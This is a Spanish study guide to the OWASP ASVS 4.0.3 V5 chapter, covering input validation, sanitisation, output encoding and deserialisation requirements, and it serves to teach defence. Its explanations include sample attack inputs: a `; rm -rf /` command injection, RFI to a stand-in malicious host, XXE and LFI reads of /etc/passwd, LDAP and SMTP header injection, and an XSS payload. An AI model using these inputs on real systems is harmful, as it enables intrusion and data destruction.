---
title: "V5: Validación, Desinfección y Codificación"
description: "Capítulo V5 del ASVS 4.0.3: validación de entrada, sanitización, codificación de salida, memoria y deserialización."
---

La debilidad más común de las aplicaciones web es usar la entrada del usuario **sin validarla** y mostrar datos **sin codificarlos**. De ahí nacen casi todas las vulnerabilidades grandes: XSS, inyección SQL, inyección de comandos, desbordamientos de buffer...

> **Objetivo de control:** la validación de entrada y la codificación de salida tienen un canal acordado para evitar ataques de inyección; los datos de entrada están fuertemente tipados, validados, de rango o longitud comprobados; los datos de salida se codifican según el contexto, lo más cerca posible del intérprete.

> **Dato clave:** controles de validación correctos, con **listas de permitidos** (positivas) y tipado fuerte, eliminan **más del 90% de todos los ataques de inyección**.

## V5.1 Validación de Entrada

### 5.1.1 — Defensas contra contaminación de parámetros HTTP (CWE-235)

> *"Verifique que la aplicación tiene defensas contra los ataques de contaminación de parámetros HTTP, especialmente si el marco de la aplicación no hace ninguna distinción sobre el origen de los parámetros de solicitud (GET, POST, cookies, encabezados o variables de entorno)."*

**Explicación:** HTTP Parameter Pollution es enviar el mismo parámetro dos veces (`?id=1&id=2`) para confundir al servidor y evadir filtros. Si el framework no distingue orígenes, define reglas claras de qué valor gana. **Niveles: L1, L2, L3.**

### 5.1.2 — Protección contra asignación masiva (CWE-915, C5)

> *"Verifique que los frameworks protegen contra ataques de asignación de parámetros masivos o que la aplicación tiene contramedidas para proteger contra la asignación de parámetros no seguros, como marcar campos privados o similares."*

**Explicación:** el ataque "mass assignment": envías `{nombre:"Ana", rol:"admin"}` y el framework asigna todo sin filtro. Debes permitir solo los campos que el usuario puede modificar. **Niveles: L1, L2, L3.**

### 5.1.3 — Validación positiva (lista de permitidos) (CWE-20, C5)

> *"Verifique que todas las entradas (campos de formulario HTML, solicitudes REST, parámetros de URL, encabezados HTTP, cookies, archivos por lotes, fuentes RSS, etc.) se validan mediante validación positiva (lista de permitidos)."*

**Explicación:** la regla de oro: **define lo que SÍ se acepta** (regex, tipos, rangos) y rechaza todo lo demás. La lista de bloqueados (deny list) siempre se queda corta; la de permitidos (allow list) siempre funciona. **Niveles: L1, L2, L3.**

### 5.1.4 — Estructuras de datos fuertemente tipadas (CWE-20, C5)

> *"Verifique que las estructuras de datos están fuertemente tipadas y validadas con un esquema definido que incluya caracteres permitidos, longitud y patrón (p. ej., números de tarjeta de crédito, direcciones de correo electrónico, números de teléfono, o validar que dos campos relacionados son razonables, como comprobar que el suburbio y el código postal coinciden)."*

**Explicación:** cada campo tiene su esquema: email es email, teléfono es teléfono, y los campos relacionados se validan entre sí (un código postal que no coincide con la ciudad es sospechoso). **Niveles: L1, L2, L3.**

### 5.1.5 — Redirecciones solo a destinos permitidos (CWE-601)

> *"Verifique que las redirecciones y reenvíos de URL solo permiten destinos que aparecen en una lista de permitidos, o muestra una advertencia al redirigir a contenido potencialmente no confiable."*

**Explicación:** la redirección abierta: `?next=http://malicioso.com` engaña al usuario (phishing) y roba tokens. Solo redirige a destinos internos permitidos. **Niveles: L1, L2, L3.**

## V5.2 Requisitos de Sanitización y Sandboxing

### 5.2.1 — Sanitización de HTML de editores WYSIWYG (CWE-116, C5)

> *"Verifique que todas las entradas HTML que no son de confianza de los editores WYSIWYG o similares se sanitizan correctamente con una biblioteca de sanitización HTML o una función de marco de trabajo."*

**Explicación:** si los usuarios escriben HTML (foros, comentarios, blogs), límpialo con librerías probadas (DOMPurify, etc.): un `<img onerror="robarSesion()">` en un comentario es XSS en vivo. **Niveles: L1, L2, L3.**

### 5.2.2 — Sanitización de datos no estructurados (CWE-138)

> *"Verifique que los datos no estructurados están sanitizados para aplicar medidas de seguridad, como caracteres permitidos y longitud."*

**Explicación:** los campos libres (notas, mensajes) también se sanitizan: límites de longitud y caracteres controlados. **Niveles: L2, L3.**

### 5.2.3 — Sanitización contra inyección SMTP/IMAP (CWE-147)

> *"Verifique que la aplicación sanitiza la entrada del usuario antes de pasar a los sistemas de correo para protegerse contra la inyección SMTP o IMAP."*

**Explicación:** un "nombre" con `\r\nBcc: atacante@x.com` puede convertir tu formulario de contacto en un spammer. Los datos que van al correo se limpian y validan. **Niveles: L2, L3.**

### 5.2.4 — Evitar eval() y ejecución de código dinámico (CWE-95)

> *"Verifique que la aplicación evita el uso de eval() u otras características de ejecución de código dinámico. Cuando no hay alternativa, cualquier entrada de usuario debe sanitizarse y ponerse en sandbox antes de ejecutarse."*

**Explicación:** `eval()` de entrada de usuario = ejecutar código del atacante. Evítalo; si es inevitable, sanitiza y aísla (sandbox). **Niveles: L1, L2, L3.**

### 5.2.5 — Protección contra inyección de plantillas (CWE-94)

> *"Verifique que la aplicación protege contra ataques de inyección de plantilla asegurándose que cualquier entrada de usuario que se incluya está sanitizada o en un lugar controlado."*

**Explicación:** los motores de plantillas (Jinja, Mustache, etc.) que interpolan entrada del usuario sin escape permiten ejecutar expresiones (Server-Side Template Injection — SSTI). **Niveles: L1, L2, L3.**

### 5.2.6 — Protección contra SSRF (CWE-918)

> *"Verifique que la aplicación protege contra ataques SSRF, validando o desinfectando datos que no son de confianza o metadatos de archivos HTTP, como nombres de archivo y campos de entrada de URL, y utiliza listas de protocolos permitidos, dominios, rutas de acceso y puertos."*

**Explicación:** si tu app descarga "una URL que el usuario escribe", el atacante puede hacer que pida recursos internos (`http://localhost/secretos`). Valida con listas de permitidos de protocolos, dominios y puertos. **Niveles: L1, L2, L3.**

### 5.2.7 — Contenido SVG sanitizado (CWE-159)

> *"Verifique que la aplicación desinfecta, deshabilita o pone en sandbox el contenido proporcionado por el usuario, con scripts de gráficos vectoriales escalables (SVG) especialmente en lo que se refiere a XSS resultante de scripts en línea y foreignObject."*

**Explicación:** los archivos SVG pueden contener JavaScript ejecutable. Si permites subir SVGs, trátalos como código peligroso: sanitiza o sírvelos como texto plano. **Niveles: L2, L3.**

### 5.2.8 — Lenguajes de plantilla/script sanitizados (CWE-94)

> *"Verifique que la aplicación desinfecta, deshabilita o pone en sandbox el contenido proporcionado por el usuario, con expresiones en lenguaje de plantilla o script como Markdown, CSS o las hojas de estilo XSL, BBCode o similares."*

**Explicación:** Markdown, BBCode o CSS de usuarios pueden ejecutar código si el renderizador no los controla. Sanitiza siempre. **Niveles: L2, L3.**

## V5.3 Codificación de Salida y Prevención de Inyección

> *"La codificación de salida cerca o adyacente al intérprete en uso es fundamental para la seguridad de cualquier aplicación. Si no se codifica la salida, se producirá una aplicación insegura e inyectable."*

### 5.3.1 — Codificación según el intérprete y contexto (CWE-116, C4)

> *"Verifique que la codificación de salida es relevante para el intérprete y el contexto requerido. Por ejemplo, utilice codificadores específicamente para valores HTML, atributos HTML, JavaScript, parámetros de URL, encabezados HTTP, SMTP y otros según lo requiera el contexto, especialmente a partir de entradas que no son de confianza."*

**Explicación:** cada contexto tiene su escape: lo que es seguro en HTML no lo es en JavaScript ni en un atributo. Usa el codificador correcto para cada destino. **Niveles: L1, L2, L3.**

### 5.3.2 — La codificación conserva el juego de caracteres (CWE-176)

> *"Verifique que la codificación de salida conserva el juego de caracteres y la configuración regional elegidos por el usuario, de modo que cualquier punto de caracteres Unicode sea válido y se maneje de forma segura."*

**Explicación:** un nombre con acentos o emojis no debe romperse ni volverse un vector de ataque por problemas de encoding. **Niveles: L1, L2, L3.**

### 5.3.3 — Escape de salida contra XSS (CWE-79, C4)

> *"Verifique que el escape de salida basado en contexto, preferiblemente automatizado - o en el peor de los casos, manual - protege contra XSS reflejado, almacenado y basado en DOM."*

**Explicación:** los datos del usuario se escapan al imprimirlos: así `<script>` se muestra como texto y no se ejecuta. Los frameworks modernos con auto-escaping (React, Vue, Angular) hacen gran parte del trabajo. **Niveles: L1, L2, L3.**

### 5.3.4 — Consultas parametrizadas (CWE-89, C3)

> *"Verifique que la selección de datos o las consultas de base de datos (por ejemplo, SQL, HQL, ORM, NoSQL) utilizan consultas parametrizadas, ORM, marcos de entidades o están protegidas de los ataques de inyección de base de datos."*

**Explicación:** la defensa definitiva contra **inyección SQL**: `SELECT * FROM u WHERE name = ?` con el valor pasado como parámetro, nunca concatenado. El dato no puede cambiar la estructura de la consulta. **Niveles: L1, L2, L3.**

### 5.3.5 — Escape SQL donde no hay parámetros (CWE-89, C3/C4)

> *"Verifique que donde los mecanismos parametrizados o más seguros no están presentes, la codificación de la salida en el contexto específico se utiliza para proteger contra ataques de inyección, como el uso de escape SQL para proteger contra la inyección SQL."*

**Explicación:** si por herencia no puedes parametrizar (tablas/columnas dinámicas), escapa con el codificador del motor de base de datos. **Niveles: L1, L2, L3.**

### 5.3.6 — Protección contra inyección JSON (CWE-830, C4)

> *"Verifique que la aplicación protege contra ataques de inyección de JSON, ataques de 'eval' en JSON y evaluación de expresiones de JavaScript."*

**Explicación:** nunca uses `eval()` para parsear JSON; usa `JSON.parse()`. Y no incrustes JSON de usuario dentro de `<script>` sin escapar `</script>`. **Niveles: L1, L2, L3.**

### 5.3.7 — Protección contra inyección LDAP (CWE-90, C4)

> *"Verifique que la aplicación protege contra vulnerabilidades de inyección LDAP o que se han implementado controles de seguridad específicos para evitar la inyección LDAP."*

**Explicación:** los filtros LDAP también se inyectan: `(&(uid=*)(userPassword=*))` en un login puede autenticar sin contraseña. Escapa o valida los valores de los filtros. **Niveles: L1, L2, L3.**

### 5.3.8 — Protección contra inyección de comandos del SO (CWE-78, C4)

> *"Verifique que la aplicación protege contra la inyección de comandos del sistema operativo y que las llamadas al sistema operativo utilizan consultas de sistema operativo parametrizadas o utilicen codificación de salida de línea de comandos contextual."*

**Explicación:** si el nombre de archivo viaja a `cmd.exe` o `sh`, un `; rm -rf /` en el nombre ejecuta lo que el atacante quiera. Nunca concatenes entrada del usuario en comandos del sistema. **Niveles: L1, L2, L3.**

### 5.3.9 — Protección contra LFI/RFI (CWE-829)

> *"Verifique que la aplicación protege contra ataques de inclusión de archivos locales (LFI) o de inclusión remota de archivos (RFI)."*

**Explicación:** si `?page=archivo.html` carga un archivo, el atacante escribe `?page=/etc/passwd` (LFI) o `?page=http://malicioso.com/shell` (RFI). Nunca uses entrada del usuario para elegir rutas de archivos. **Niveles: L1, L2, L3.**

### 5.3.10 — Protección contra inyección XPath/XML (CWE-643, C4)

> *"Verifique que la aplicación protege contra ataques de inyección XPath o de inyección XML."*

**Explicación:** los lenguajes de consulta XML (XPath) también se inyectan para saltar autenticación o leer nodos. Parametriza o valida. **Niveles: L1, L2, L3.**

> **Notas del estándar:** las consultas parametrizadas no bastan para nombres de tabla/columna u ORDER BY (no se pueden escapar): esos campos nunca deben venir del usuario. Y el formato SVG permite script ECMA casi en todos los contextos: sirve los SVG como texto plano o en dominio separado.

## V5.4 Memoria, Cadena y Código No Administrado

> Estos requisitos **solo aplican si la aplicación usa lenguajes de sistemas o código no administrado** (C, C++, etc.).

### 5.4.1 — Funciones de memoria seguras (CWE-120)

> *"Verifique que la aplicación utiliza cadenas de memoria segura, copia de memoria más segura y aritmética de puntero para detectar o evitar desbordamientos de pila, buffer o heap."*

**Explicación:** en C/C++, reemplaza `strcpy`/`sprintf` por variantes seguras con límites (`strncpy_s`, `snprintf`): previene desbordamientos de buffer. **Niveles: L2, L3.**

### 5.4.2 — Cadenas de formato constantes (CWE-134)

> *"Verifique que las cadenas de formato no toman entradas potencialmente hostiles y son constantes."*

**Explicación:** `printf(entrada_usuario)` permite leer/escribir memoria (format string attack). Las cadenas de formato siempre son literales. **Niveles: L2, L3.**

### 5.4.3 — Validación para evitar desbordamientos de enteros (CWE-190)

> *"Verifique que se utilizan técnicas de validación de signos, intervalos y entradas para evitar desbordamientos de enteros."*

**Explicación:** un `int` que se desborda se vuelve negativo o diminuto y puede evadir validaciones de tamaño (ej. buffer de 3 bytes que acepta 4 mil millones). Valida rangos. **Niveles: L2, L3.**

## V5.5 Prevención de Deserialización

### 5.5.1 — Objetos serializados con integridad (CWE-502, C5)

> *"Verifique que los objetos serializados utilizan comprobaciones de integridad o están cifrados para evitar la creación de objetos hostiles o la manipulación de datos."*

**Explicación:** si la app deserializa datos del usuario (cookies PHP, Java serialization), el atacante puede construir objetos maliciosos. Firma o cifra lo que deserializas. **Niveles: L1, L2, L3.**

### 5.5.2 — Analizadores XML restrictivos (CWE-611)

> *"Verifique que la aplicación restringe correctamente los analizadores XML para que solo usen la configuración más restrictiva posible y para asegurarse de que las características no seguras, como la resolución de entidades externas, están deshabilitadas para evitar ataques XML eXternal Entity (XXE)."*

**Explicación:** el ataque XXE: un XML malicioso con `<!ENTITY xxe SYSTEM "file:///etc/passwd">` hace que el parser lea archivos del servidor. Desactiva las entidades externas (DTD). **Niveles: L1, L2, L3.**

### 5.5.3 — Evitar deserialización de datos no confiables (CWE-502)

> *"Verifique que la deserialización de datos que no son de confianza se evita o está protegida tanto en código personalizado como en bibliotecas de terceros (como analizadores JSON, XML y YAML)."*

**Explicación:** si debes deserializar, usa formatos simples (JSON) y listas de clases permitidas; nunca deserialices objetos completos de fuentes no confiables. **Niveles: L1, L2, L3.**

### 5.5.4 — JSON.parse en lugar de eval (CWE-95)

> *"Verifique que al analizar JSON en exploradores o backends basados en JavaScript, JSON.parse se utiliza para analizar el documento JSON. No utilice eval() para analizar JSON."*

**Explicación:** `JSON.parse` solo lee datos; `eval` ejecuta código. La diferencia entre un JSON inofensivo y un payload que toma tu servidor. **Niveles: L1, L2, L3.**

## Referencias

OWASP Testing Guide 4.0 (Input Validation, HTTP Parameter Pollution, Client Side), Cheat Sheets de Input Validation, LDAP Injection, Cross Site Scripting Prevention, DOM Based XSS, Mass Assignment, XXE Prevention; DOMPurify; notas sobre auto-escaping (Angular, etc.).

## Resumen

> V5 es el capítulo de las inyecciones: valida con listas de permitidos,
> sanitiza el HTML, codifica la salida por contexto, usa consultas
> parametrizadas, evita eval() y deserialización insegura. Cubre el 90% de
> las vulnerabilidades críticas de las aplicaciones web reales.